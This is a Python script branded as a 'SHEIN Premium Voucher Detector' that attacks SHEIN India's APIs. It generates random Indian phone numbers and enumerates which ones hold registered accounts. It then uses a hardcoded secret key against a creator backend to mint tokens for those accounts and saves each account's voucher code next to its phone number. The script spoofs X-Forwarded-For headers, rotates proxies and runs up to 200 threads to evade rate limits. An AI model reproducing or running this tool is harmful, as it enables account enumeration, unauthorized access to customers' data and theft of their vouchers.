#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
╔══════════════════════════════════════════════════════════════════════════════╗
║                     SHEIN PREMIUM VOUCHER DETECTOR v2.0                     ║
║                         Enterprise Grade Scanner                            ║
╚══════════════════════════════════════════════════════════════════════════════╝
"""

import requests
import random
import json
import time
import os
import traceback
from pathlib import Path
from datetime import datetime
from concurrent.futures import ThreadPoolExecutor, as_completed
from requests.adapters import HTTPAdapter
from urllib3.util.retry import Retry
from typing import Optional, Dict, Any, Tuple, List
import sys

# ==============================================================================
# PREMIUM VISUAL DESIGN SYSTEM
# ==============================================================================

class DesignSystem:
    """
    Enterprise-grade visual design system with elegant color palette
    and sophisticated typography for premium user experience
    """
    
    # Sophisticated Color Palette
    class Colors:
        # Primary Colors
        GOLD = '\033[38;5;220m'          # Elegant Gold
        PLATINUM = '\033[38;5;255m'       # Premium White
        ROSE_GOLD = '\033[38;5;218m'       # Rose Gold Accent
        EMERALD = '\033[38;5;47m'          # Success Green
        RUBY = '\033[38;5;196m'             # Error Red
        SAPPHIRE = '\033[38;5;39m'          # Info Blue
        AMETHYST = '\033[38;5;141m'         # Purple Accent
        ONYX = '\033[38;5;240m'              # Dark Gray
        
        # Status Colors
        SUCCESS = '\033[38;5;83m'            # Bright Green
        WARNING = '\033[38;5;214m'            # Orange
        DANGER = '\033[38;5;203m'              # Coral Red
        INFO = '\033[38;5;117m'                 # Sky Blue
        RATE_LIMIT = '\033[38;5;208m'           # Deep Orange
        ACCESS_DENIED = '\033[38;5;129m'        # Deep Purple
        DEBUG = '\033[38;5;245m'                 # Gray
        
        # Text Styles
        BOLD = '\033[1m'
        DIM = '\033[2m'
        ITALIC = '\033[3m'
        UNDERLINE = '\033[4m'
        RESET = '\033[0m'
        
        # Gradients (simulated through combinations)
        GRADIENT_START = '\033[38;5;219m'
        GRADIENT_END = '\033[38;5;147m'

    # Elegant Icons and Symbols
    class Icons:
        # Status Icons
        SUCCESS = "✦"           # Success star
        ERROR = "✧"             # Error star
        WARNING = "⚠"           # Warning
        INFO = "ℹ"              # Info
        VOUCHER = "🎯"          # Voucher found
        CHECK = "✓"             # Check mark
        CROSS = "✗"             # Cross mark
        ARROW = "→"             # Right arrow
        BULLET = "•"            # Bullet point
        DIAMOND = "◆"           # Diamond bullet
        
        # Category Icons
        PHONE = "📱"             # Phone
        TOKEN = "🔑"             # Token
        PROFILE = "👤"           # Profile
        PROXY = "🌐"             # Proxy
        DATABASE = "💾"          # Save
        STATS = "📊"             # Statistics
        BATCH = "📦"             # Batch
        TIME = "⏱"              # Time
        THREAD = "⚡"            # Thread
        
        # Decorative
        STAR = "★"
        HEART = "♥"
        DIAMOND = "♦"
        CLUB = "♣"
        SPADE = "♠"
        LINE = "─"
        DOUBLE_LINE = "═"

# ==============================================================================
# CONFIGURATION MANAGEMENT
# ==============================================================================

class Config:
    """Centralized configuration management with validation"""
    
    PROXY_FILE = "proxies.txt"
    OUTPUT_FILE = "vsvouchers.txt"
    SECRET_KEY = "3LFcKwBTXcsMzO5LaUbNYoyMSpt7M3RP5dW9ifWffzg"
    
    # Browser Headers (Preserved exactly as provided)
    BROWSER_HEADERS = {
        "User-Agent": "Mozilla/5.0 (Linux; Android 10; RMX2030 Build/QKQ1.200209.002) AppleKit/537.36 (KHTML, like Gecko) Chrome/142 Mobile Safari/537.36",
        "Accept": "application/json",
        "Referer": "https://www.sheinindia.in/",
        "X-TENANT-ID": "SHEIN",
    }
    
    # Premium Formatting
    HEADER_WIDTH = 80
    SUBHEADER_WIDTH = 60

# ==============================================================================
# UTILITY FUNCTIONS
# ==============================================================================

class Formatter:
    """Professional formatting utilities"""
    
    @staticmethod
    def timestamp() -> str:
        """Returns formatted timestamp with elegant styling"""
        current = datetime.now().strftime("%H:%M:%S")
        return f"{DesignSystem.Colors.DIM}[{current}]{DesignSystem.Colors.RESET}"
    
    @staticmethod
    def section_header(title: str, width: int = Config.HEADER_WIDTH) -> str:
        """Creates a beautiful section header with decorative elements"""
        line = DesignSystem.Icons.DOUBLE_LINE * (width - len(title) - 4)
        return (f"\n{DesignSystem.Colors.GOLD}{DesignSystem.Colors.BOLD}"
                f"╔{line}╗\n"
                f"║  {title}  ║\n"
                f"╚{line}╝{DesignSystem.Colors.RESET}\n")
    
    @staticmethod
    def subheader(title: str) -> str:
        """Creates an elegant subheader"""
        return (f"{DesignSystem.Colors.PLATINUM}{DesignSystem.Colors.BOLD}"
                f"┌─ {title} {DesignSystem.Icons.ARROW}\n"
                f"└{DesignSystem.Colors.RESET}")
    
    @staticmethod
    def status_code(status: int, endpoint: str, proxy: str = "") -> str:
        """Professional status code formatter with contextual icons"""
        
        status_config = {
            200: (DesignSystem.Colors.SUCCESS, DesignSystem.Icons.SUCCESS, "OK"),
            201: (DesignSystem.Colors.SUCCESS, DesignSystem.Icons.SUCCESS, "Created"),
            204: (DesignSystem.Colors.SUCCESS, DesignSystem.Icons.SUCCESS, "No Content"),
            400: (DesignSystem.Colors.WARNING, DesignSystem.Icons.WARNING, "Bad Request"),
            401: (DesignSystem.Colors.WARNING, DesignSystem.Icons.WARNING, "Unauthorized"),
            403: (DesignSystem.Colors.ACCESS_DENIED, "🔒", "Forbidden"),
            404: (DesignSystem.Colors.WARNING, "🔍", "Not Found"),
            429: (DesignSystem.Colors.RATE_LIMIT, "⏳", "Rate Limited"),
            500: (DesignSystem.Colors.DANGER, "💥", "Server Error"),
            502: (DesignSystem.Colors.DANGER, "🌩️", "Bad Gateway"),
            503: (DesignSystem.Colors.DANGER, "🔧", "Unavailable"),
            504: (DesignSystem.Colors.DANGER, "⏰", "Timeout"),
        }
        
        color, icon, label = status_config.get(status, 
            (DesignSystem.Colors.INFO, DesignSystem.Icons.INFO, "Unknown"))
        
        status_display = f"{color}{icon} {status} {label}{DesignSystem.Colors.RESET}"
        
        return (f"{Formatter.timestamp()} {status_display} "
                f"{DesignSystem.Colors.DIM}| {endpoint:<20} |{proxy[:30]}{DesignSystem.Colors.RESET}")

# ==============================================================================
# PROXY MANAGER
# ==============================================================================

class ProxyManager:
    """Sophisticated proxy management with rotation and validation"""
    
    def __init__(self):
        self.proxies = self._load_proxies()
        self.current_index = 0
    
    def _load_proxies(self) -> List[str]:
        """Load and validate proxies from file"""
        if not os.path.exists(Config.PROXY_FILE):
            return []
        
        with open(Config.PROXY_FILE, "r") as f:
            proxies = [line.strip() for line in f 
                      if line.strip() and not line.startswith('#')]
        
        return proxies
    
    def get_random(self) -> Optional[Dict[str, str]]:
        """Returns a random proxy in requests format"""
        if not self.proxies:
            return None
        
        proxy_str = random.choice(self.proxies)
        return {
            "http": f"http://{proxy_str}",
            "https": f"http://{proxy_str}",
        }
    
    def get_display_name(self) -> str:
        """Returns formatted proxy name for display"""
        if not self.proxies:
            return "Local Connection"
        return random.choice(self.proxies).split('@')[-1][:20]

# ==============================================================================
# DATA STORAGE
# ==============================================================================

class Vault:
    """Secure voucher storage with metadata"""
    
    @staticmethod
    def store(voucher_data: Dict[str, Any]) -> None:
        """Stores voucher with timestamp and metadata"""
        voucher_data.update({
            "timestamp": datetime.now().isoformat(),
            "version": "2.0",
            "scanner": "Premium Detector"
        })
        
        with open(Config.OUTPUT_FILE, "a", encoding="utf-8") as f:
            f.write(json.dumps(voucher_data, indent=2) + "\n")
        
        print(f"{Formatter.timestamp()} "
              f"{DesignSystem.Colors.EMERALD}{DesignSystem.Icons.DATABASE} "
              f"Voucher secured → {Config.OUTPUT_FILE}{DesignSystem.Colors.RESET}")

# ==============================================================================
# CORE SCANNER ENGINE
# ==============================================================================

class PremiumSheinScanner:
    """
    Enterprise-grade scanner with sophisticated error handling
    and elegant status reporting
    """
    
    def __init__(self):
        self.session = self._create_session()
        self.proxy_manager = ProxyManager()
        
        # Performance Metrics
        self.metrics = {
            'checked': 0,
            'found': 0,
            'registered': 0,
            'status_codes': {},
            'start_time': time.time(),
            'api_calls': 0
        }
    
    def _create_session(self) -> requests.Session:
        """Creates optimized session with retry strategy"""
        session = requests.Session()
        
        # Advanced retry strategy
        retry_strategy = Retry(
            total=2,
            backoff_factor=0.3,
            status_forcelist=[429, 500, 502, 503, 504],
        )
        
        adapter = HTTPAdapter(
            max_retries=retry_strategy,
            pool_connections=10,
            pool_maxsize=20
        )
        
        session.mount("http://", adapter)
        session.mount("https://", adapter)
        session.headers.update(Config.BROWSER_HEADERS)
        
        return session
    
    def _track_status(self, status_code: int) -> None:
        """Tracks status codes for analytics"""
        self.metrics['status_codes'][status_code] = \
            self.metrics['status_codes'].get(status_code, 0) + 1
        self.metrics['api_calls'] += 1
    
    def _generate_ip(self) -> str:
        """Generates valid public IP addresses"""
        first = random.choice([x for x in range(1, 255) 
                              if x not in [10, 127, 172, 192]])
        return f"{first}.{random.randint(0,255)}.{random.randint(0,255)}.{random.randint(1,254)}"
    
    def _extract_token(self, data: Any) -> Optional[str]:
        """Intelligent token extraction from various response formats"""
        if not data or not isinstance(data, dict):
            return None
        
        # Standard token fields
        for key in ["access_token", "accessToken", "token"]:
            if key in data and data[key]:
                return data[key]
        
        # Nested data structures
        if "data" in data and isinstance(data["data"], dict):
            for key in ["access_token", "accessToken"]:
                if key in data["data"] and data["data"][key]:
                    return data["data"][key]
        
        return None
    
    # ==========================================================================
    # API METHODS (Preserved exactly as provided)
    # ==========================================================================
    
    def get_client_token(self, proxy_dict: Optional[Dict]) -> Optional[Dict]:
        """Original get_client_token method - functionality preserved"""
        url = "https://api.services.sheinindia.in/uaas/jwt/token/client"
        endpoint = "get_client_token"
        headers = {
            'Client_type': 'Android/31',
            'Client_version': '1.0.10',
            'Content-Type': 'application/x-www-form-urlencoded',
            'X-Forwarded-For': self._generate_ip()
        }
        data = "grantType=client_credentials&clientName=trusted_client&clientSecret=secret"
        
        try:
            r = self.session.post(url, headers=headers, data=data, 
                                 proxies=proxy_dict, timeout=15)
            
            self._track_status(r.status_code)
            print(Formatter.status_code(r.status_code, endpoint, 
                                       f"Proxy: {str(proxy_dict)[:20] if proxy_dict else 'None'}"))
            
            return r.json() if r.status_code == 200 else None
            
        except Exception as e:
            print(f"{Formatter.timestamp()} "
                  f"{DesignSystem.Colors.DANGER}{DesignSystem.Icons.ERROR} "
                  f"Request failed: {endpoint} - {str(e)[:50]}{DesignSystem.Colors.RESET}")
            return None
    
    def check_shein_account(self, token: str, phone: str, 
                           proxy_dict: Optional[Dict]) -> Optional[Dict]:
        """Original check_shein_account method - functionality preserved"""
        url = "https://api.services.sheinindia.in/uaas/accountCheck"
        endpoint = "check_shein_account"
        headers = {
            'Authorization': f'Bearer {token}',
            'Requestid': 'account_check',
            'Content-Type': 'application/x-www-form-urlencoded',
            'X-Forwarded-For': self._generate_ip()
        }
        data = f"mobileNumber={phone}"
        
        try:
            r = self.session.post(url, headers=headers, data=data, 
                                 proxies=proxy_dict, timeout=10)
            
            self._track_status(r.status_code)
            print(Formatter.status_code(r.status_code, endpoint))
            
            return r.json() if r.status_code == 200 else None
            
        except Exception as e:
            print(f"{Formatter.timestamp()} "
                  f"{DesignSystem.Colors.DANGER}{DesignSystem.Icons.ERROR} "
                  f"Request failed: {endpoint}{DesignSystem.Colors.RESET}")
            return None
    
    def get_encrypted_id(self, phone: str, proxy_dict: Optional[Dict]) -> Optional[str]:
        """Original get_encrypted_id method - functionality preserved"""
        endpoint = "get_encrypted_id"
        
        try:
            tokdata = self.get_client_token(proxy_dict)
            if not tokdata:
                print(f"{Formatter.timestamp()} "
                      f"{DesignSystem.Colors.WARNING}{DesignSystem.Icons.WARNING} "
                      f"Token acquisition failed for {phone}{DesignSystem.Colors.RESET}")
                return None
            
            token = self._extract_token(tokdata)
            if not token:
                print(f"{Formatter.timestamp()} "
                      f"{DesignSystem.Colors.WARNING}{DesignSystem.Icons.WARNING} "
                      f"No token in response{DesignSystem.Colors.RESET}")
                return None
            
            time.sleep(random.uniform(0.5, 1.0))
            data = self.check_shein_account(token, phone, proxy_dict)
            
            if data and isinstance(data, dict):
                # Deep search for encryptedId
                if "data" in data and isinstance(data["data"], dict):
                    if "encryptedId" in data["data"]:
                        return data["data"]["encryptedId"]
                if "result" in data and isinstance(data["result"], dict):
                    if "encryptedId" in data["result"]:
                        return data["result"]["encryptedId"]
                if "encryptedId" in data:
                    return data["encryptedId"]
            
            return None
            
        except Exception as e:
            print(f"{Formatter.timestamp()} "
                  f"{DesignSystem.Colors.DANGER}{DesignSystem.Icons.ERROR} "
                  f"Error in get_encrypted_id: {str(e)[:50]}{DesignSystem.Colors.RESET}")
            return None
    
    def get_creator_token(self, phone: str, enc: str, 
                          proxy_dict: Optional[Dict]) -> Optional[str]:
        """Original get_creator_token method - functionality preserved"""
        url = "https://shein-creator-backend-151437891745.asia-south1.run.app/api/v1/auth/generate-token"
        endpoint = "get_creator_token"
        payload = {
            "client_type": "Android/31",
            "client_version": "1.0.10",
            "gender": "male",
            "phone_number": phone,
            "secret_key": Config.SECRET_KEY,
            "user_id": enc,
            "user_name": "CLI_User"
        }
        
        try:
            r = self.session.post(url, json=payload, proxies=proxy_dict, timeout=10)
            
            self._track_status(r.status_code)
            print(Formatter.status_code(r.status_code, endpoint))
            
            return self._extract_token(r.json()) if r.status_code == 200 else None
            
        except Exception as e:
            print(f"{Formatter.timestamp()} "
                  f"{DesignSystem.Colors.DANGER}{DesignSystem.Icons.ERROR} "
                  f"Request failed: {endpoint}{DesignSystem.Colors.RESET}")
            return None
    
    def get_user_profile(self, token: str, proxy_dict: Optional[Dict]) -> Optional[Dict]:
        """Original get_user_profile method - functionality preserved"""
        url = "https://shein-creator-backend-151437891745.asia-south1.run.app/api/v1/user"
        endpoint = "get_user_profile"
        headers = {
            "Authorization": f"Bearer {token}",
            "X-Forwarded-For": self._generate_ip()
        }
        
        try:
            r = self.session.get(url, headers=headers, proxies=proxy_dict, timeout=10)
            
            self._track_status(r.status_code)
            print(Formatter.status_code(r.status_code, endpoint))
            
            return r.json() if r.status_code == 200 else None
            
        except Exception as e:
            print(f"{Formatter.timestamp()} "
                  f"{DesignSystem.Colors.DANGER}{DesignSystem.Icons.ERROR} "
                  f"Request failed: {endpoint}{DesignSystem.Colors.RESET}")
            return None
    
    def extract_voucher_from_profile(self, profile_data: Optional[Dict]) -> Tuple[Optional[str], Optional[str]]:
        """Original extract_voucher method - functionality preserved"""
        if not profile_data or not isinstance(profile_data, dict):
            return None, None
        
        def deep_search(node):
            if isinstance(node, dict):
                # Check for voucher patterns
                code = (node.get("voucher_code") or 
                       node.get("voucherCode") or 
                       node.get("voucherId"))
                
                amount = (node.get("voucher_amount") or 
                         node.get("voucherAmount") or 
                         node.get("amount"))
                
                if not code and "code" in node and isinstance(node.get("code"), str) and len(str(node.get("code"))) > 4:
                    code = node.get("code")
                    amount = node.get("amount") or node.get("discount") or "Unknown"
                
                if code:
                    return str(code), str(amount) if amount else "Unknown"
                
                # Recursive search
                for value in node.values():
                    if isinstance(value, (dict, list)):
                        c, a = deep_search(value)
                        if c:
                            return c, a
            
            elif isinstance(node, list):
                for item in node:
                    if isinstance(item, (dict, list)):
                        c, a = deep_search(item)
                        if c:
                            return c, a
            
            return None, None
        
        return deep_search(profile_data)
    
    def generate_indian_numbers(self, count: int) -> List[str]:
        """Original number generator - functionality preserved"""
        prefixes = ['6', '7', '8', '9']
        return [random.choice(prefixes) + ''.join(random.choices('0123456789', k=9)) 
                for _ in range(count)]
    
    # ==========================================================================
    # CORE PROCESSING
    # ==========================================================================
    
    def process_number(self, phone: str, use_proxy: bool = True) -> Optional[Tuple[str, str, str]]:
        """Processes a single number with elegant status reporting"""
        
        proxy_dict = self.proxy_manager.get_random() if use_proxy else None
        proxy_display = self.proxy_manager.get_display_name()
        
        print(f"\n{Formatter.timestamp()} "
              f"{DesignSystem.Colors.SAPPHIRE}{DesignSystem.Icons.PHONE} "
              f"Analyzing {phone} via {proxy_display}{DesignSystem.Colors.RESET}")
        
        # Get encrypted ID
        enc = self.get_encrypted_id(phone, proxy_dict)
        if not enc:
            print(f"{Formatter.timestamp()} "
                  f"{DesignSystem.Colors.DANGER}{DesignSystem.Icons.CROSS} "
                  f"Not Registered: {phone}{DesignSystem.Colors.RESET}")
            return None
        
        print(f"{Formatter.timestamp()} "
              f"{DesignSystem.Colors.EMERALD}{DesignSystem.Icons.SUCCESS} "
              f"Registered Account: {phone}{DesignSystem.Colors.RESET}")
        self.metrics['registered'] += 1
        
        # Get creator token
        token = self.get_creator_token(phone, enc, proxy_dict)
        if not token:
            print(f"{Formatter.timestamp()} "
                  f"{DesignSystem.Colors.WARNING}{DesignSystem.Icons.WARNING} "
                  f"Token generation failed{DesignSystem.Colors.RESET}")
            return None
        
        # Get profile
        profile = self.get_user_profile(token, proxy_dict)
        if not profile:
            print(f"{Formatter.timestamp()} "
                  f"{DesignSystem.Colors.WARNING}{DesignSystem.Icons.WARNING} "
                  f"Profile fetch failed{DesignSystem.Colors.RESET}")
            return None
        
        # Extract voucher
        code, amount = self.extract_voucher_from_profile(profile)
        
        if code:
            print(f"\n{DesignSystem.Colors.GOLD}{DesignSystem.Colors.BOLD}")
            print(f"  ╔══════════════════════════════════════════════════════════╗")
            print(f"  ║  {DesignSystem.Icons.VOUCHER}  VOUCHER DETECTED  {DesignSystem.Icons.VOUCHER}                  ║")
            print(f"  ╠══════════════════════════════════════════════════════════╣")
            print(f"  ║  Phone: {phone:<35} ║")
            print(f"  ║  Code : {code:<35} ║")
            print(f"  ║  Value: ₹{amount:<34} ║")
            print(f"  ╚══════════════════════════════════════════════════════════╝")
            print(f"{DesignSystem.Colors.RESET}")
            
            self.metrics['found'] += 1
            return phone, code, amount
        else:
            print(f"{Formatter.timestamp()} "
                  f"{DesignSystem.Colors.INFO}{DesignSystem.Icons.INFO} "
                  f"No voucher found for {phone}{DesignSystem.Colors.RESET}")
            
            # Debug output (preserved)
            print(f"{DesignSystem.Colors.DIM}  [Debug] Response: "
                  f"{json.dumps(profile)[:200]}...{DesignSystem.Colors.RESET}")
            
            return None
    
    # ==========================================================================
    # OPERATION MODES
    # ==========================================================================
    
    def manual_check(self) -> bool:
        """Interactive manual verification mode"""
        print(Formatter.section_header("MANUAL VERIFICATION PORTAL"))
        
        while True:
            try:
                phone = input(f"\n{DesignSystem.Colors.PLATINUM}"
                             f"Enter 10-digit Indian number → "
                             f"{DesignSystem.Colors.RESET}").strip()
                
                if phone.lower() in ['n', 'q', 'exit']:
                    return False
                
                if phone.isdigit() and len(phone) == 10:
                    break
                
                print(f"{DesignSystem.Colors.WARNING}"
                     f"{DesignSystem.Icons.WARNING} Invalid format. "
                     f"Please use 10 digits.{DesignSystem.Colors.RESET}")
                     
            except KeyboardInterrupt:
                return False
            except Exception as e:
                print(f"{DesignSystem.Colors.DANGER}Error: {e}{DesignSystem.Colors.RESET}")
                continue
        
        result = self.process_number(phone)
        if result:
            phone, code, amount = result
            Vault.store({"phone": phone, "code": code, "amount": amount, "type": "manual"})
            
            print(f"\n{DesignSystem.Colors.EMERALD}{DesignSystem.Icons.SUCCESS} "
                  f"Verification complete. Voucher secured.{DesignSystem.Colors.RESET}")
        else:
            print(f"\n{DesignSystem.Colors.INFO}Verification complete. "
                  f"No voucher detected.{DesignSystem.Colors.RESET}")
        
        return True
    
    def batch_mode(self) -> None:
        """Enterprise batch processing mode"""
        print(Formatter.section_header("BATCH PROCESSING CONFIGURATION"))
        
        # Configuration input with elegant styling
        print(f"{DesignSystem.Colors.PLATINUM}Processing Parameters:{DesignSystem.Colors.RESET}")
        
        try:
            threads = int(input(f"  {DesignSystem.Icons.THREAD} Threads (1-200) [5]: ") or "5")
            batch_size = int(input(f"  {DesignSystem.Icons.BATCH} Batch size (10-500) [20]: ") or "20")
            delay = int(input(f"  {DesignSystem.Icons.TIME} Delay (0-5s) [1]: ") or "1")
        except ValueError:
            print(f"{DesignSystem.Colors.WARNING}Invalid input, using defaults.{DesignSystem.Colors.RESET}")
            threads, batch_size, delay = 5, 20, 1
        
        print(f"\n{DesignSystem.Colors.EMERALD}{DesignSystem.Colors.BOLD}")
        print(f"  ╔══════════════════════════════════════════════════════════╗")
        print(f"  ║  🚀  INITIALIZING BATCH PROCESSOR  🚀                    ║")
        print(f"  ╠══════════════════════════════════════════════════════════╣")
        print(f"  ║  Threads   : {threads:<3}                                      ║")
        print(f"  ║  Batch Size: {batch_size:<3}                                      ║")
        print(f"  ║  Delay     : {delay}s                                       ║")
        print(f"  ╚══════════════════════════════════════════════════════════╝")
        print(f"{DesignSystem.Colors.RESET}")
        
        print(f"{DesignSystem.Colors.DIM}Press Ctrl+C to gracefully terminate{DesignSystem.Colors.RESET}\n")
        
        try:
            batch_counter = 0
            
            while True:
                batch_counter += 1
                print(Formatter.subheader(f"BATCH #{batch_counter}"))
                
                numbers = self.generate_indian_numbers(batch_size)
                batch_found = 0
                
                with ThreadPoolExecutor(max_workers=threads) as executor:
                    futures = {executor.submit(self.process_number, num): num 
                              for num in numbers}
                    
                    for future in as_completed(futures):
                        self.metrics['checked'] += 1
                        
                        try:
                            result = future.result()
                            if result:
                                phone, code, amount = result
                                Vault.store({
                                    "phone": phone, 
                                    "code": code, 
                                    "amount": amount, 
                                    "type": "batch"
                                })
                                batch_found += 1
                                
                        except Exception as e:
                            print(f"{Formatter.timestamp()} "
                                  f"{DesignSystem.Colors.DANGER}"
                                  f"{DesignSystem.Icons.ERROR} Thread error: {str(e)[:50]}"
                                  f"{DesignSystem.Colors.RESET}")
                
                # Batch summary
                self._display_batch_summary(batch_counter, batch_found)
                
                # Inter-batch delay
                sleep_time = 5 if batch_found > 0 else 3
                print(f"\n{DesignSystem.Colors.DIM}{DesignSystem.Icons.TIME} "
                      f"Cooldown: {sleep_time}s{DesignSystem.Colors.RESET}")
                time.sleep(sleep_time)
                
        except KeyboardInterrupt:
            print(f"\n\n{DesignSystem.Colors.WARNING}{DesignSystem.Icons.WARNING} "
                  f"Batch processing terminated by user{DesignSystem.Colors.RESET}")
        except Exception as e:
            print(f"\n{DesignSystem.Colors.DANGER}{DesignSystem.Icons.ERROR} "
                  f"Batch error: {str(e)}{DesignSystem.Colors.RESET}")
    
    def _display_batch_summary(self, batch_num: int, found: int) -> None:
        """Displays elegant batch summary"""
        elapsed = time.time() - self.metrics['start_time']
        rate = self.metrics['checked'] / elapsed if elapsed > 0 else 0
        
        print(f"\n{DesignSystem.Colors.GOLD}{DesignSystem.Colors.BOLD}")
        print(f"  ┌─ BATCH #{batch_num} SUMMARY {'─' * 40}┐")
        print(f"  │                                            │")
        print(f"  │  {DesignSystem.Icons.VOUCHER} Found      : {found:<3}                         │")
        print(f"  │  {DesignSystem.Icons.STATS} Total Found : {self.metrics['found']:<3}                         │")
        print(f"  │  {DesignSystem.Icons.CHECK} Checked     : {self.metrics['checked']:<3}                         │")
        print(f"  │  {DesignSystem.Icons.TIME} Rate        : {rate:.1f}/s                     │")
        print(f"  └{DesignSystem.Colors.RESET}")
        
        # Status code summary
        if self.metrics['status_codes']:
            print(f"\n{DesignSystem.Colors.DIM}Status Distribution:{DesignSystem.Colors.RESET}")
            for code in sorted(self.metrics['status_codes'].keys()):
                count = self.metrics['status_codes'][code]
                bar = "█" * min(count, 20)
                print(f"  {DesignSystem.Colors.INFO}{code}:{DesignSystem.Colors.RESET} "
                      f"{bar} {DesignSystem.Colors.DIM}({count}){DesignSystem.Colors.RESET}")
    
    def display_final_stats(self) -> None:
        """Displays comprehensive final statistics"""
        elapsed = time.time() - self.metrics['start_time']
        minutes = elapsed / 60
        rate = self.metrics['checked'] / elapsed if elapsed > 0 else 0
        
        print(Formatter.section_header("FINAL PERFORMANCE REPORT"))
        
        print(f"{DesignSystem.Colors.PLATINUM}")
        print(f"  ╔══════════════════════════════════════════════════════════╗")
        print(f"  ║  EXECUTION SUMMARY                                        ║")
        print(f"  ╠══════════════════════════════════════════════════════════╣")
        print(f"  ║  {DesignSystem.Icons.CHECK} Numbers Checked : {self.metrics['checked']:<5}                      ║")
        print(f"  ║  {DesignSystem.Icons.SUCCESS} Registered     : {self.metrics['registered']:<5}                      ║")
        print(f"  ║  {DesignSystem.Icons.VOUCHER} Vouchers Found : {self.metrics['found']:<5}                      ║")
        print(f"  ║  {DesignSystem.Icons.TIME} Time Elapsed   : {minutes:.1f} min                    ║")
        print(f"  ║  {DesignSystem.Icons.STATS} Success Rate   : {(self.metrics['found']/max(self.metrics['checked'],1)*100):.1f}%                   ║")
        print(f"  ╚══════════════════════════════════════════════════════════╝")
        print(f"{DesignSystem.Colors.RESET}")
        
        # Detailed status code breakdown
        if self.metrics['status_codes']:
            print(f"\n{DesignSystem.Colors.GOLD}API Status Distribution:{DesignSystem.Colors.RESET}")
            print(f"{DesignSystem.Colors.DIM}{'─' * 50}{DesignSystem.Colors.RESET}")
            
            for code in sorted(self.metrics['status_codes'].keys()):
                count = self.metrics['status_codes'][code]
                percentage = (count / self.metrics['api_calls'] * 100) if self.metrics['api_calls'] else 0
                
                # Color based on status code
                if 200 <= code < 300:
                    color = DesignSystem.Colors.EMERALD
                elif 300 <= code < 400:
                    color = DesignSystem.Colors.INFO
                elif code == 429:
                    color = DesignSystem.Colors.RATE_LIMIT
                elif code == 403:
                    color = DesignSystem.Colors.ACCESS_DENIED
                elif 400 <= code < 500:
                    color = DesignSystem.Colors.WARNING
                else:
                    color = DesignSystem.Colors.DANGER
                
                bar_length = int(percentage / 2)  # Scale for display
                bar = "█" * bar_length
                
                print(f"  {color}HTTP {code}:{DesignSystem.Colors.RESET} "
                      f"{bar:<25} {DesignSystem.Colors.DIM}{count} calls ({percentage:.1f}%){DesignSystem.Colors.RESET}")

# ==============================================================================
# APPLICATION ENTRY POINT
# ==============================================================================

def main():
    """Premium application entry point"""
    try:
        # Clear screen for clean start
        os.system('cls' if os.name == 'nt' else 'clear')
        
        # Grand entrance banner
        print(f"{DesignSystem.Colors.GOLD}{DesignSystem.Colors.BOLD}")
        print(f"╔{'═' * 78}╗")
        print(f"║{' ' * 78}║")
        print(f"║{' ' * 10}SHEIN PREMIUM VOUCHER DETECTION SYSTEM v2.0{' ' * 15}║")
        print(f"║{' ' * 15}Enterprise Grade Scanner | Concurrent Edition{' ' * 13}║")
        print(f"║{' ' * 78}║")
        print(f"╚{'═' * 78}╝")
        print(f"{DesignSystem.Colors.RESET}")
        
        # System information
        print(f"{DesignSystem.Colors.DIM}System initialized at: "
              f"{datetime.now().strftime('%Y-%m-%d %H:%M:%S')}{DesignSystem.Colors.RESET}")
        
        # Proxy status
        proxy_manager = ProxyManager()
        if proxy_manager.proxies:
            print(f"{DesignSystem.Colors.EMERALD}{DesignSystem.Icons.PROXY} "
                  f"Proxy Pool: {len(proxy_manager.proxies)} active proxies{DesignSystem.Colors.RESET}")
        else:
            print(f"{DesignSystem.Colors.WARNING}{DesignSystem.Icons.WARNING} "
                  f"No proxies found. Create {Config.PROXY_FILE} for optimal performance{DesignSystem.Colors.RESET}")
        
        # Initialize scanner
        scanner = PremiumSheinScanner()
        
        # Manual verification mode
        print(f"\n{DesignSystem.Colors.GOLD}Step 1: Manual Verification{DesignSystem.Colors.RESET}")
        if not scanner.manual_check():
            print(f"{DesignSystem.Colors.INFO}Manual verification skipped.{DesignSystem.Colors.RESET}")
        
        # Batch processing mode
        print(f"\n{DesignSystem.Colors.GOLD}Step 2: Batch Processing{DesignSystem.Colors.RESET}")
        choice = input(f"{DesignSystem.Colors.PLATINUM}"
                      f"Initialize batch processing? (y/n) → "
                      f"{DesignSystem.Colors.RESET}").strip().lower()
        
        if choice == 'y':
            scanner.batch_mode()
        
        # Final statistics
        scanner.display_final_stats()
        
        # Graceful exit
        print(f"\n{DesignSystem.Colors.ROSE_GOLD}{DesignSystem.Icons.HEART} "
              f"Thank you for using Premium Detector. "
              f"Goodbye! {DesignSystem.Icons.HEART}{DesignSystem.Colors.RESET}\n")
        
    except KeyboardInterrupt:
        print(f"\n\n{DesignSystem.Colors.WARNING}{DesignSystem.Icons.WARNING} "
              f"Application terminated by user. "
              f"See you next time!{DesignSystem.Colors.RESET}\n")
        sys.exit(0)
        
    except Exception as e:
        print(f"\n{DesignSystem.Colors.DANGER}{DesignSystem.Icons.ERROR} "
              f"Critical system error: {str(e)}{DesignSystem.Colors.RESET}")
        print(f"{DesignSystem.Colors.DIM}{traceback.format_exc()}{DesignSystem.Colors.RESET}")
        sys.exit(1)

if __name__ == "__main__":
    main()

